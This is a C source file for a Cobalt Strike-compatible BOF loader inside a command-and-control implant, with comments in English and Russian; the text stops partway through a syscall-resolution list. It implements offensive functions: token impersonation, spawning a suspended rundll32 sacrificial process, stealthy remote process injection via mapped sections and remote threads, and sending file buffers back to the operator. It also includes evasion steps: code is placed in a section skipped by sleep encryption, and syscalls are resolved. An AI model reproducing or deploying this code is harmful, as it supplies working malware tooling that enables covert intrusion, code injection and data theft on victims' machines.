// BOF (Beacon Object File) loader.
//
// Parses a COFF/PE object file (x64), applies relocations, resolves external
// symbols in the form __imp_<Module>$<Function>, and invokes the entry point.
// Compatible with the Cobalt Strike public BOF API so community BOFs run as-is.
//
// Relocation types handled: IMAGE_REL_AMD64_REL32, IMAGE_REL_AMD64_ADDR64,
//                           IMAGE_REL_AMD64_ADDR32NB.

#include "../core/beacon.h"
#include <winnt.h>
#include <stdarg.h> // compiler-level header, safe with /Zl

// ASM-обёртки вызова BOF entry point.
// x64: bof_call.asm — выравнивание RSP + table-based SEH (FRAME/PUSHREG).
// x86: bof_call_x86.asm — ручной SEH через FS:[0] (без CRT _except_handler3).
#if defined(_M_X64)
extern void bof_call_aligned(void* ep, const char* args, int args_len);
#else
extern void bof_call_x86(void* ep, const char* args, int args_len, DWORD* seh_code);
#endif

// Весь код этого файла помещается в секцию .sleep, которую Ekko пропускает
// при шифровании. Это позволяет загрузчику BOF работать без краша даже если
// .text зашифрован в момент диспетчеризации задачи.
#pragma code_seg(".sleep")

// ---- Debug helpers: немедленная отправка строки клиенту --------------------

static void bof_u32_to_str(char* buf, uint32_t v) {
    char tmp[12]; int n = 0;
    if (!v) { buf[0] = '0'; buf[1] = 0; return; }
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    int i = 0; while (n) buf[i++] = tmp[--n]; buf[i] = 0;
}

static void bof_ptr_to_hex(char* buf, uint64_t v) {
    const char* h = "0123456789abcdef";
    buf[0]='0'; buf[1]='x';
    for (int i = 0; i < 16; ++i)
        buf[2 + i] = h[(v >> (60 - i*4)) & 0xF];
    buf[18] = 0;
}

// Строит строку вида "[bof] " + prefix + str + "\n" и немедленно отправляет.
static void bof_dbg(const char* prefix, const char* str) {
    char buf[512];
    int n = 0;
    const char hdr[] = "[bof] ";
    for (int i = 0; hdr[i]; ++i) buf[n++] = hdr[i];
    for (int i = 0; prefix[i] && n < 480; ++i) buf[n++] = prefix[i];
    for (int i = 0; str[i]    && n < 490; ++i) buf[n++] = str[i];
    buf[n++] = '\n'; buf[n] = 0;
    out_write(buf, (size_t)n);
    out_flush_chunk(get_transport(), 0);
}

static void bof_dbg_u32(const char* prefix, uint32_t v) {
    char num[12]; bof_u32_to_str(num, v);
    bof_dbg(prefix, num);
}

static void bof_dbg_ptr(const char* prefix, uint64_t v) {
    char hex[20]; bof_ptr_to_hex(hex, v);
    bof_dbg(prefix, hex);
}

// ---- Beacon API runtime (CS-compatible) ------------------------------------

// These symbols are exported to BOF code via the import stub lookup.
// They call back into the beacon output buffer and other services.

static void _bof_printf(int type, const char* fmt, ...) {
    // Minimal variadic formatting — only %s, %d/%i, %x/%X, %u supported.
    (void)type;
    char buf[2048];
    va_list va;
    va_start(va, fmt);

    char* out = buf;
    size_t rem = sizeof(buf) - 1;
    const char* p = fmt;
    while (*p && rem > 0) {
        if (*p == '%' && *(p+1)) {
            ++p;
            if (*p == 's') {
                const char* s = va_arg(va, const char*);
                if (!s) s = "(null)";
                while (*s && rem > 0) { *out++ = *s++; --rem; }
            } else if (*p == 'd' || *p == 'i') {
                int v = va_arg(va, int);
                char tmp[12]; int neg = 0;
                if (v < 0) { neg = 1; v = -v; }
                int n = 0;
                if (!v) tmp[n++] = '0';
                else { char t2[12]; int m=0; while(v){t2[m++]=(char)('0'+v%10);v/=10;} while(m)tmp[n++]=t2[--m]; }
                if (neg && rem > 0) { *out++ = '-'; --rem; }
                for (int i = 0; i < n && rem > 0; ++i) { *out++ = tmp[i]; --rem; }
            } else if (*p == 'u') {
                unsigned v = va_arg(va, unsigned);
                char tmp[12]; int n = 0;
                if (!v) tmp[n++] = '0';
                else { char t2[12]; int m=0; while(v){t2[m++]=(char)('0'+v%10);v/=10;} while(m)tmp[n++]=t2[--m]; }
                for (int i = 0; i < n && rem > 0; ++i) { *out++ = tmp[i]; --rem; }
            } else if (*p == 'l') {
                // Handle %lu / %ld — Windows LLP64: long == int (32-bit).
                ++p;
                if (*p == 'u') {
                    unsigned v = va_arg(va, unsigned);
                    char tmp[12]; int n = 0;
                    if (!v) tmp[n++] = '0';
                    else { char t2[12]; int m=0; unsigned u=v; while(u){t2[m++]=(char)('0'+u%10);u/=10;} while(m)tmp[n++]=t2[--m]; }
                    for (int i = 0; i < n && rem > 0; ++i) { *out++ = tmp[i]; --rem; }
                } else if (*p == 'd' || *p == 'i') {
                    int v = va_arg(va, int);
                    char tmp[12]; int neg = 0;
                    if (v < 0) { neg = 1; v = -v; }
                    int n = 0;
                    if (!v) tmp[n++] = '0';
                    else { char t2[12]; int m=0; while(v){t2[m++]=(char)('0'+v%10);v/=10;} while(m)tmp[n++]=t2[--m]; }
                    if (neg && rem > 0) { *out++ = '-'; --rem; }
                    for (int i = 0; i < n && rem > 0; ++i) { *out++ = tmp[i]; --rem; }
                }
                // Unknown modifier after 'l': skip both chars.
            } else if (*p == 'x' || *p == 'X') {
                unsigned v = va_arg(va, unsigned);
                const char* hex = (*p=='x') ? "0123456789abcdef" : "0123456789ABCDEF";
                char tmp[9]; int n=0;
                if (!v) tmp[n++]='0';
                else { uint32_t u=v; char t2[8]; int m=0; while(u){t2[m++]=hex[u&0xF];u>>=4;} while(m)tmp[n++]=t2[--m]; }
                for (int i=0;i<n&&rem>0;++i){*out++=tmp[i];--rem;}
            } else {
                if (rem > 0) { *out++ = '%'; --rem; }
                if (rem > 0) { *out++ = *p; --rem; }
            }
            ++p;
        } else {
            *out++ = *p++;
            --rem;
        }
    }
    *out = '\0';
    va_end(va);
    out_write(buf, rt_strlen(buf));
}

static void _bof_output(int type, const char* data, int len) {
    (void)type;
    if (data && len > 0) out_write(data, (size_t)len);
}

// ---- datap: CS-совместимая структура для разбора аргументов BOF ------------
// Поля: original, buffer, length, size — точно как в CS beacon.h.
typedef struct { char* original; char* buffer; int length; int size; } bof_datap;

static void  _bof_data_parse(bof_datap* p, char* buf, int len) {
    p->original = p->buffer = buf; p->length = len; p->size = len;
}
static int   _bof_data_int(bof_datap* p) {
    if (p->length < 4) return 0;
    int v; rt_memcpy(&v, p->buffer, 4); p->buffer += 4; p->length -= 4; return v;
}
static short _bof_data_short(bof_datap* p) {
    if (p->length < 2) return 0;
    short v; rt_memcpy(&v, p->buffer, 2); p->buffer += 2; p->length -= 2; return v;
}
static int   _bof_data_length(bof_datap* p) { return (int)(p->buffer - p->original); }
static char* _bof_data_extract(bof_datap* p, int* slen) {
    if (p->length < 4) return NULL;
    int len; rt_memcpy(&len, p->buffer, 4); p->buffer += 4; p->length -= 4;
    if (len > p->length) return NULL;
    char* s = p->buffer; p->buffer += len; p->length -= len;
    if (slen) *slen = len;
    return s;
}
// BeaconDataPtr — читает len байт из буфера без копирования.
static char* _bof_data_ptr(bof_datap* p, int len) {
    if (p->length < len) return NULL;
    char* s = p->buffer; p->buffer += len; p->length -= len;
    return s;
}

// ---- formatp: CS-совместимая структура для форматирования данных ------------
// Те же 4 поля что и datap; original — выделенный буфер, buffer — не используется
// (CS хранит курсор в length), size — максимальный размер.
typedef struct { char* original; char* buffer; int length; int size; } bof_formatp;

// BeaconFormatAlloc — выделяет буфер для форматирования.
static void _bof_format_alloc(bof_formatp* f, int maxsz) {
    f->original = (char*)bmalloc((size_t)maxsz);
    f->buffer   = f->original;
    f->length   = 0;
    f->size     = maxsz;
    if (f->original) rt_memset(f->original, 0, (size_t)maxsz);
}

// BeaconFormatFree — освобождает буфер.
static void _bof_format_free(bof_formatp* f) {
    if (f->original) bfree(f->original);
    f->original = NULL;
    f->buffer   = NULL;
    f->length   = 0;
    f->size     = 0;
}

// BeaconFormatReset — обнуляет содержимое, сбрасывает курсор.
static void _bof_format_reset(bof_formatp* f) {
    if (f->original && f->size > 0)
        rt_memset(f->original, 0, (size_t)f->size);
    f->length = 0;
}

// BeaconFormatAppend — добавляет len байт в буфер.
static void _bof_format_append(bof_formatp* f, const char* text, int len) {
    if (f->length + len > f->size) return;
    rt_memcpy(f->original + f->length, text, (size_t)len);
    f->length += len;
}

// BeaconFormatPrintf — форматирует строку и добавляет в буфер.
static void _bof_format_printf(bof_formatp* f, const char* fmt, ...) {
    char tmp[2048];
    va_list va; va_start(va, fmt);
    int n = wvsprintfA(tmp, fmt, va);
    va_end(va);
    if (n > 0) _bof_format_append(f, tmp, n);
}

// BeaconFormatToString — возвращает указатель на буфер и длину.
static char* _bof_format_tostr(bof_formatp* f, int* sz) {
    if (sz) *sz = f->length;
    return f->original;
}

// BeaconFormatInt — записывает int в big-endian формате (CS-совместимо).
static void _bof_format_int(bof_formatp* f, int v) {
    if (f->length + 4 > f->size) return;
    unsigned char* d = (unsigned char*)(f->original + f->length);
    d[0] = (unsigned char)(v >> 24);
    d[1] = (unsigned char)(v >> 16);
    d[2] = (unsigned char)(v >>  8);
    d[3] = (unsigned char)(v);
    f->length += 4;
}

// BeaconGetSpawnTo — заполняет buf путём к spawnto-процессу.
// CS-сигнатура: void(BOOL x86, char* buf, int sz).
static void _bof_get_spawnto(BOOL x86, char* buf, int sz) {
    if (!buf || sz <= 0) return;
    if (x86) {
        // SysWOW64 — для 32-разрядного дочернего процесса.
        GetSystemWow64DirectoryA(buf, (UINT)sz);
    } else {
        GetSystemDirectoryA(buf, (UINT)sz);
    }
    int n = 0; while (buf[n]) ++n;
    const char tail[] = "\\rundll32.exe";
    for (int i = 0; tail[i] && n < sz - 1; ++i) buf[n++] = tail[i];
    buf[n] = '\0';
}

// BeaconDownload — отправляет произвольный буфер как файл (RESP_FILE).
// Аналог AxDownloadMemory в Adaptix.
static BOOL _bof_download(const char* filename, const char* data, unsigned int len) {
    if (!data || len == 0) return FALSE;

    // Формат RESP_FILE: 4 байта длины имени файла (LE) + имя + данные.
    // Имя файла передаётся как часть данных out_write перед содержимым,
    // аналогично тому как cmd_download кладёт путь перед содержимым файла.
    // В Co2H RESP_FILE: [4-byte name_len][name][file_bytes].
    DWORD nlen = 0;
    if (filename) { while (filename[nlen]) ++nlen; }

    // Устанавливаем тип ответа как RESP_FILE для текущей задачи.
    // out_begin уже вызван BOF-загрузчиком с RESP_OUTPUT.
    // Единственный способ «подменить» тип — начать новый фрейм.
    // Используем transport_direct_send с нужными данными:
    // формируем буфер [4:nlen][name][data] и шлём как RESP_FILE.
    size_t total = 4 + nlen + len;
    char* buf = (char*)bmalloc(total);
    if (!buf) return FALSE;

    buf[0] = (char)(nlen & 0xFF);
    buf[1] = (char)((nlen >> 8) & 0xFF);
    buf[2] = (char)((nlen >> 16) & 0xFF);
    buf[3] = (char)((nlen >> 24) & 0xFF);
    if (nlen) rt_memcpy(buf + 4, filename, nlen);
    rt_memcpy(buf + 4 + nlen, data, len);

    // Прямая отправка с типом RESP_FILE — клиент сохранит буфер как файл.
    extern uint64_t g_bof_task_id;
    transport_direct_send_typed(get_transport(), g_bof_task_id,
                                RESP_FILE,
                                (const uint8_t*)buf, total);
    bfree(buf);
    return TRUE;
}

// toWideChar — конвертирует ANSI → UTF-16 через MultiByteToWideChar.
static BOOL _bof_to_widechar(const char* src, wchar_t* dst, int max) {
    if (!src || !dst || max <= 0) return FALSE;
    int n = MultiByteToWideChar(CP_ACP, 0, src, -1, dst, max);
    return n > 0;
}

// ---- Token impersonation ---------------------------------------------------

// ExitProcess — заглушка: BOF не должен убивать весь процесс beacon'а.
// Некоторые BOF-ы (PrintSpoofer и др.) вызывают ExitProcess при ошибке —
// перехватываем и просто возвращаемся, позволяя beacon'у продолжить работу.
static void _bof_exit_process(UINT code) { (void)code; }
static void _bof_exit_thread(DWORD code) { (void)code; }

// BeaconUseToken — имперсонализация токена в текущем потоке.
// Дублирует токен для ImpersonateLoggedOnUser (требует TOKEN_DUPLICATE | TOKEN_QUERY).
static BOOL _bof_use_token(HANDLE token) {
    if (!token || token == INVALID_HANDLE_VALUE) return FALSE;
    HANDLE dup = NULL;
    if (!DuplicateToken(token, SecurityImpersonation, &dup)) return FALSE;
    BOOL ok = ImpersonateLoggedOnUser(dup);
    CloseHandle(dup);
    return ok;
}

// BeaconRevertToken — возврат к исходному контексту потока.
static void _bof_revert_token(void) { RevertToSelf(); }

// ---- Process spawn/inject --------------------------------------------------

// Путь к spawnto берётся из той же логики, что BeaconGetSpawnTo.
// x86: %WinDir%\SysWOW64\rundll32.exe, x64: System32\rundll32.exe.
static void _fill_spawnto(BOOL x86, char* buf, int sz) {
    if (x86) {
        // SysWOW64 rundll32 — для 32-разрядного дочернего процесса.
        GetSystemWow64DirectoryA(buf, (UINT)sz);
    } else {
        GetSystemDirectoryA(buf, (UINT)sz);
    }
    int n = 0; while (buf[n]) ++n;
    const char tail[] = "\\rundll32.exe";
    for (int i = 0; tail[i] && n < sz-1; ++i) buf[n++] = tail[i];
    buf[n] = '\0';
}

// BeaconSpawnTemporaryProcess — запускает дочерний процесс-жертву в suspended состоянии.
// Если ignoreToken=FALSE и у потока есть impersonation-токен, процесс создаётся
// через CreateProcessAsUserA для запуска от имени импersonированного пользователя.
// Возвращает TRUE при успехе; hProcess/hThread/dwProcessId/dwThreadId заполнены.
static BOOL _bof_spawn_temp(BOOL x86, BOOL ignoreToken,
                             STARTUPINFOA* si, PROCESS_INFORMATION* pi) {
    if (!pi) return FALSE;

    char spawnto[MAX_PATH];
    _fill_spawnto(x86, spawnto, MAX_PATH);

    // Флаги: CREATE_SUSPENDED — инжектируем до старта; NO_WINDOW — без консоли.
    const DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;

    BOOL ok = FALSE;
    if (!ignoreToken) {
        // Пытаемся получить impersonation-токен текущего потока.
        HANDLE thrTok = NULL;
        if (OpenThreadToken(GetCurrentThread(),
                            TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY,
                            TRUE, &thrTok)) {
            HANDLE primTok = NULL;
            // ImpersonationToken → PrimaryToken (нужен для CreateProcessAsUser).
            if (DuplicateTokenEx(thrTok,
                                 TOKEN_ALL_ACCESS, NULL,
                                 SecurityImpersonation, TokenPrimary, &primTok)) {
                ok = CreateProcessAsUserA(primTok, spawnto, NULL, NULL, NULL,
                                          FALSE, flags, NULL, NULL, si, pi);
                CloseHandle(primTok);
            }
            CloseHandle(thrTok);
        }
    }
    // Fallback — без токена.
    if (!ok) {
        ok = CreateProcessA(spawnto, NULL, NULL, NULL,
                            FALSE, flags, NULL, NULL, si, pi);
    }
    return ok;
}

// ---- NT-функции для скрытого инжекта через секцию -------------------------
// Динамически резолвятся из ntdll.dll — без импорта заголовков NT.

typedef LONG NTSTATUS;
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#endif

// NtCreateSection
typedef NTSTATUS (WINAPI* pfnNtCreateSection)(
    PHANDLE            SectionHandle,
    ACCESS_MASK        DesiredAccess,
    PVOID              ObjectAttributes,
    PLARGE_INTEGER     MaximumSize,
    ULONG              SectionPageProtection,
    ULONG              AllocationAttributes,
    HANDLE             FileHandle);

// NtMapViewOfSection
typedef NTSTATUS (WINAPI* pfnNtMapViewOfSection)(
    HANDLE             SectionHandle,
    HANDLE             ProcessHandle,
    PVOID*             BaseAddress,
    ULONG_PTR          ZeroBits,
    SIZE_T             CommitSize,
    PLARGE_INTEGER     SectionOffset,
    PSIZE_T            ViewSize,
    DWORD              InheritDisposition, // ViewUnmap = 2
    ULONG              AllocationType,
    ULONG              Win32Protect);

// NtUnmapViewOfSection
typedef NTSTATUS (WINAPI* pfnNtUnmapViewOfSection)(
    HANDLE             ProcessHandle,
    PVOID              BaseAddress);

// Резолвим один раз при первом вызове; ntdll всегда загружена.
static pfnNtCreateSection    _NtCreateSection    = NULL;
static pfnNtMapViewOfSection _NtMapViewOfSection = NULL;
static pfnNtUnmapViewOfSection _NtUnmapViewOfSection = NULL;

static BOOL _resolve_nt_fns(void) {
    if (_NtCreateSection) return TRUE;
    // api_resolve принимает хэши имени модуля и функции.
    // ntdll.dll уже загружена — GetModuleHandleA безопаснее здесь,
    // чем повторное api_resolve (избегаем двойного хэша).
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;
    _NtCreateSection     = (pfnNtCreateSection)    GetProcAddress(ntdll, "NtCreateSection");
    _NtMapViewOfSection  = (pfnNtMapViewOfSection) GetProcAddress(ntdll, "NtMapViewOfSection");
    _NtUnmapViewOfSection= (pfnNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    return _NtCreateSection && _NtMapViewOfSection && _NtUnmapViewOfSection;
}

// Вспомогательная: инжектируем payload в процесс через NtCreateSection +
// NtMapViewOfSection без единого PAGE_EXECUTE_READWRITE аллоцирования.
//
// Схема:
//   1. NtCreateSection(PAGE_EXECUTE_READWRITE) — секция в pagefile.
//   2. NtMapViewOfSection(local, PAGE_READWRITE) — локальный RW-вид.
//   3. memcpy payload+args в локальный вид.
//   4. NtUnmapViewOfSection(local) — снимаем локальный вид.
//   5. NtMapViewOfSection(target, PAGE_EXECUTE_READ) — RX-вид в цели.
//   6. CreateRemoteThread на ep внутри удалённого вида.
//
// Возвращает HANDLE потока или NULL при ошибке.
static HANDLE _inject_into(HANDLE hProc,
                            const char* payload, int p_len, int p_offset,
                            const char* arg, int a_len) {
    if (!hProc || !payload || p_len <= 0) return NULL;
    if (!_resolve_nt_fns()) {
        // Ntdll недоступен — крайне маловероятно, но на всякий случай.
        return NULL;
    }

    const int total = p_len + (arg && a_len > 0 ? a_len : 0);

    // 1. Создаём разделяемую секцию в pagefile.
    HANDLE hSec = NULL;
    LARGE_INTEGER secSize;
    secSize.QuadPart = (LONGLONG)total;
    NTSTATUS st = _NtCreateSection(
        &hSec,
        SECTION_ALL_ACCESS,
        NULL,                   // без ObjectAttributes — анонимная секция
        &secSize,
        PAGE_EXECUTE_READWRITE, // права секции (не вида!)
        SEC_COMMIT,
        NULL);                  // не файл — pagefile
    if (!NT_SUCCESS(st) || !hSec) return NULL;

    // 2. Маппируем локально с правами RW для записи payload.
    void*  localView = NULL;
    SIZE_T viewSize  = 0;
    st = _NtMapViewOfSection(
        hSec, GetCurrentProcess(), &localView,
        0, 0, NULL, &viewSize,
        2,              // ViewUnmap
        0, PAGE_READWRITE);
    if (!NT_SUCCESS(st)) { CloseHandle(hSec); return NULL; }

    // 3. Копируем payload и аргументы в локальный вид.
    rt_memcpy(localView, payload, (size_t)p_len);
    if (arg && a_len > 0)
        rt_memcpy((char*)localView + p_len, arg, (size_t)a_len);

    // 4. Снимаем локальный вид — данные остаются в секции.
    _NtUnmapViewOfSection(GetCurrentProcess(), localView);

    // 5. Маппируем в целевой процесс только для чтения+исполнения.
    void*  remoteView = NULL;
    SIZE_T remoteSize = 0;
    st = _NtMapViewOfSection(
        hSec, hProc, &remoteView,
        0, 0, NULL, &remoteSize,
        2,              // ViewUnmap
        0, PAGE_EXECUTE_READ);  // RX — не RWX
    CloseHandle(hSec);          // секция жива пока живы виды
    if (!NT_SUCCESS(st)) return NULL;

    // 6. Запускаем поток с точки входа внутри удалённого вида.
    LPTHREAD_START_ROUTINE ep =
        (LPTHREAD_START_ROUTINE)((char*)remoteView + p_offset);
    HANDLE ht = nt_create_thread(hProc, (PVOID)ep, NULL);
    // remoteView не освобождаем — поток работает в этой памяти.
    // NtUnmapViewOfSection будет вызван ОС при завершении процесса.
    return ht;
}

// BeaconInjectProcess — инжект в уже запущенный процесс по HANDLE.
// Открывать процесс заново не нужно — HANDLE передаётся готовым.
static void _bof_inject_process(HANDLE hProc, int pid,
                                 char* payload, int p_len, int p_offset,
                                 char* arg, int a_len) {
    (void)pid; // pid не нужен — у нас уже есть HANDLE
    HANDLE ht = _inject_into(hProc, payload, p_len, p_offset, arg, a_len);
    if (ht) CloseHandle(ht);
}

// BeaconInjectTemporaryProcess — инжект в suspended-процесс, созданный
// через BeaconSpawnTemporaryProcess, затем возобновляем его.
static void _bof_inject_temp_process(PROCESS_INFORMATION* pi,
                                      char* payload, int p_len, int p_offset,
                                      char* arg, int a_len) {
    if (!pi || !pi->hProcess) return;
    HANDLE ht = _inject_into(pi->hProcess, payload, p_len, p_offset, arg, a_len);
    if (ht) {
        // Suspended главный поток больше не нужен — у нас уже есть инжектированный.
        TerminateThread(pi->hThread, 0);
        CloseHandle(ht);
    } else {
        // Инжект не удался — возобновляем, чтобы процесс завершился сам.
        ResumeThread(pi->hThread);
    }
}

// BeaconCleanupProcess — закрывает HANDLE-ы процесса и потока, не убивая процесс.
// Процесс продолжает жить (актуально для долгоживущих payload-ов — reverse shell и т.п.).
// CS-контракт: BOF вызывает эту функцию только когда убедился, что payload запустился.
static void _bof_cleanup_process(PROCESS_INFORMATION* pi) {
    if (!pi) return;
    if (pi->hProcess && pi->hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(pi->hProcess);
        pi->hProcess = NULL;
    }
    if (pi->hThread && pi->hThread != INVALID_HANDLE_VALUE) {
        CloseHandle(pi->hThread);
        pi->hThread = NULL;
    }
}
static BOOL _bof_is_admin(void) {
    BOOL ok = FALSE; HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return FALSE;
    TOKEN_ELEVATION elev; DWORD cb = sizeof(elev);
    if (GetTokenInformation(tok, TokenElevation, &elev, cb, &cb)) ok = elev.TokenIsElevated;
    CloseHandle(tok); return ok;
}

// ---- CS 4.9+: Key/Value хранилище (живёт между вызовами BOF в сессии) ------

#define BOF_KV_MAX 64
typedef struct { uint32_t hash; void* ptr; int used; } BofKvEntry;
static BofKvEntry g_bof_kv[BOF_KV_MAX];

static uint32_t bof_kv_hash(const char* key) {
    uint32_t h = 5381;
    while (*key) { h = ((h << 5) + h) ^ (uint8_t)*key; ++key; }
    return h ? h : 1;
}

// BeaconAddValue — сохраняет указатель по ключу; обновляет если уже есть.
static BOOL _bof_add_value(const char* key, void* ptr) {
    uint32_t h = bof_kv_hash(key);
    // Обновление существующего ключа.
    for (int i = 0; i < BOF_KV_MAX; ++i)
        if (g_bof_kv[i].used && g_bof_kv[i].hash == h) { g_bof_kv[i].ptr = ptr; return TRUE; }
    // Вставка нового.
    for (int i = 0; i < BOF_KV_MAX; ++i)
        if (!g_bof_kv[i].used) { g_bof_kv[i].hash = h; g_bof_kv[i].ptr = ptr; g_bof_kv[i].used = 1; return TRUE; }
    return FALSE;
}

// BeaconGetValue — возвращает указатель по ключу или NULL.
static void* _bof_get_value(const char* key) {
    uint32_t h = bof_kv_hash(key);
    for (int i = 0; i < BOF_KV_MAX; ++i)
        if (g_bof_kv[i].used && g_bof_kv[i].hash == h) return g_bof_kv[i].ptr;
    return NULL;
}

// BeaconRemoveValue — удаляет запись по ключу.
static BOOL _bof_remove_value(const char* key) {
    uint32_t h = bof_kv_hash(key);
    for (int i = 0; i < BOF_KV_MAX; ++i)
        if (g_bof_kv[i].used && g_bof_kv[i].hash == h) { g_bof_kv[i].used = 0; g_bof_kv[i].ptr = NULL; return TRUE; }
    return FALSE;
}

// ---- CS 4.9+: BeaconInformation --------------------------------------------

#define BOF_MASK_SIZE 13
typedef struct { char* ptr; size_t size; } bof_heap_record;

// Минимальный BEACON_INFO — достаточно для совместимости с CS 4.12 BOF.
// Полный макет: version, sleep_mask_ptr, sleep_mask_text_size, sleep_mask_total_size,
// beacon_ptr, heap_records, mask[13], allocatedMemory.
// allocatedMemory — большая вложенная структура, BOF получает её обнулённой.
typedef struct {
    unsigned int     version;
    char*            sleep_mask_ptr;
    DWORD            sleep_mask_text_size;
    DWORD            sleep_mask_total_size;
    char*            beacon_ptr;
    bof_heap_record* heap_records;
    char             mask[BOF_MASK_SIZE];
    char             allocatedMemory[6 * 512]; // примерный размер ALLOCATED_MEMORY
} bof_beacon_info;

static BOOL _bof_information(bof_beacon_info* info) {
    if (!info) return FALSE;
    // version уже задан вызывающим кодом — не перезаписываем.
    info->sleep_mask_ptr        = NULL;
    info->sleep_mask_text_size  = 0;
    info->sleep_mask_total_size = 0;
    // beacon_ptr — указываем на секцию .text нашего модуля (приблизительно).
    HMODULE hSelf = GetModuleHandleA(NULL);
    info->beacon_ptr   = (char*)hSelf;
    info->heap_records = NULL;
    rt_memset(info->mask, 0, BOF_MASK_SIZE);
    // allocatedMemory оставляем обнулённой (BOF увидит PURPOSE_EMPTY).
    return TRUE;
}

// ---- CS 4.9+: Data Store (заглушки — у нас нет хранилища данных) -----------

static void*  _bof_ds_get_item(size_t idx)    { (void)idx; return NULL; }
static void   _bof_ds_protect(size_t idx)     { (void)idx; }
static void   _bof_ds_unprotect(size_t idx)   { (void)idx; }
static size_t _bof_ds_max_entries(void)        { return 0; }

// ---- CS 4.9+: BeaconGetCustomUserData (заглушка) ---------------------------

static char* _bof_get_custom_user_data(void) { return NULL; }

// ---- CS 4.10+: BeaconGetSyscallInformation ---------------------------------

// SYSCALL_API_ENTRY: адрес функции, адрес jmp-инструкции, номер сисколла.
typedef struct { void* fnAddr; void* jmpAddr; DWORD sysnum; } bof_sc_entry;

// Таблица сисколлов и RTL-функций (макет CS 4.11).
typedef struct {
    bof_sc_entry ntAllocateVirtualMemory;
    bof_sc_entry ntProtectVirtualMemory;
    bof_sc_entry ntFreeVirtualMemory;
    bof_sc_entry ntGetContextThread;
    bof_sc_entry ntSetContextThread;
    bof_sc_entry ntResumeThread;
    bof_sc_entry ntCreateThreadEx;
    bof_sc_entry ntOpenProcess;
    bof_sc_entry ntOpenThread;
    bof_sc_entry ntClose;
    bof_sc_entry ntCreateSection;
    bof_sc_entry ntMapViewOfSection;
    bof_sc_entry ntUnmapViewOfSection;
    bof_sc_entry ntQueryVirtualMemory;
    bof_sc_entry ntDuplicateObject;
    bof_sc_entry ntReadVirtualMemory;
    bof_sc_entry ntWriteVirtualMemory;
    bof_sc_entry ntReadFile;
    bof_sc_entry ntWriteFile;
    bof_sc_entry ntCreateFile;
    bof_sc_entry ntQueueApcThread;
    bof_sc_entry ntCreateProcess;
    bof_sc_entry ntOpenProcessToken;
    bof_sc_entry ntTestAlert;
    bof_sc_entry ntSuspendProcess;
    bof_sc_entry ntResumeProcess;
    bof_sc_entry ntQuerySystemInformation;
    bof_sc_entry ntQueryDirectoryFile;
    bof_sc_entry ntSetInformationProcess;
    bof_sc_entry ntSetInformationThread;
    bof_sc_entry ntQueryInformationProcess;
    bof_sc_entry ntQueryInformationThread;
    bof_sc_entry ntOpenSection;
    bof_sc_entry ntAdjustPrivilegesToken;
    bof_sc_entry ntDeviceIoControlFile;
    bof_sc_entry ntWaitForMultipleObjects;
} bof_syscall_api;

typedef struct {
    void* rtlDosPathNameToNtPathNameUWithStatusAddr;
    void* rtlFreeHeapAddr;
    void* rtlGetProcessHeapAddr;
} bof_rtl_api;

typedef struct {
    bof_syscall_api syscalls;
    bof_rtl_api     rtls;
} bof_beacon_syscalls;

static BOOL _bof_get_syscall_info(bof_beacon_syscalls* info, SIZE_T infoSize, BOOL resolve) {
    if (!info || infoSize < sizeof(bof_beacon_syscalls)) return FALSE;
    rt_memset(info, 0, sizeof(bof_beacon_syscalls));
    if (!resolve) return TRUE;

    HMODULE nt = GetModuleHandleA("ntdll.dll");
    if (!nt) return FALSE;

    // Макрос для разрешения одной записи сисколла.
    #define RESOLVE_SC(field, name) do { \
        void* fn = (void*)GetProcAddress(nt, name); \
        info->syscalls.field.fnAddr  = fn; \
        info->syscalls.field.jmpAddr = fn; \
        info->syscalls.field.sysnum  = 0; \
    } while(0)

    RESOLVE_SC(ntAllocateVirtualMemory,   "NtAllocateVirtualMemory");
    RESOLVE_SC(ntProtectVirtualMemory,    "NtProtectVirtualMemory");
    RESOLVE_SC(ntFreeVirtualMemory,       "NtFreeVirtualMemory");
    RESOLVE_SC(ntGetContextThread,        "NtGetContextThread");
    RESOLVE_SC(ntSetContextThread,        "NtSetContextThread");
    RESOLVE_SC(ntResumeThread,            "NtResumeThread");
    RESOLVE_SC(ntCreateThreadEx,          "NtCreateThreadEx");
    RESOLVE_SC(ntOpenProcess,             "NtOpenProcess");
    RESOLVE_SC(ntOpenThread,              "NtOpenThread");
    RESOLVE_SC(ntClose,                   "NtClose");
    RESOLVE_SC(ntCreateSection,           "NtCreateSection");
    RESOLVE_SC(ntMapViewOfSection,        "NtMapViewOfSection");
    RESOLVE_SC(ntUnmapViewOfSection,      "NtUnmapViewOfSection");
    RESOLVE_SC(ntQueryVirtualMemory,      "NtQueryVirtualMemory");
    RESOLVE_SC(ntDuplicateObject,         "NtDuplicateObject");
    RESOLVE_SC(ntReadVirtualMemory,       "NtReadVirtualMemory");
    RESOLVE_SC(ntWriteVirtualMemory,      "NtWriteVirtualMemory");
    RESOLVE_SC(ntReadFile,                "NtReadFile");
    RESOLVE_SC(ntWriteFile,               "NtWriteFile");
    RESOLVE_SC(ntCreateFile,              "NtCreateFile");
    RESOLVE_SC(ntQueueApcThread,          "NtQueueApcThread");
    RESOLVE_SC(ntCreateProcess,           "NtCreateProcess");
    RESOLVE_SC(ntOpenProcessToken,        "NtOpenProcessToken");
    RESOLVE_SC(ntTestAlert,               "NtTestAlert");
    RESOLVE_SC(ntSuspendProcess,          "NtSuspendProcess");
    RESOLVE_SC(ntResumeProcess,           "NtResumeProcess");
    RESOLVE_SC(ntQuerySystemInformation,  "NtQuerySystemInformation");
    RESOLVE_SC(ntQueryDirectoryFile,      "NtQueryDirectoryFile");
    RESOLVE_SC(ntSetInformationProcess,   "NtSetInformationProcess");
    RESOLVE_SC(ntSetInformationThread,    "NtSetInformationThread");
    RESOLVE_SC(ntQueryInformationProcess, "NtQueryInformationProcess");
    RESOLVE_SC(ntQueryInformationThread,  "NtQueryInformationThread");
    RESOLVE_SC(ntOpenSection,             "NtOpenSection");
    RESOLVE_SC(ntAdjustPrivilegesToken,   "NtAdjustPrivilegesToken");
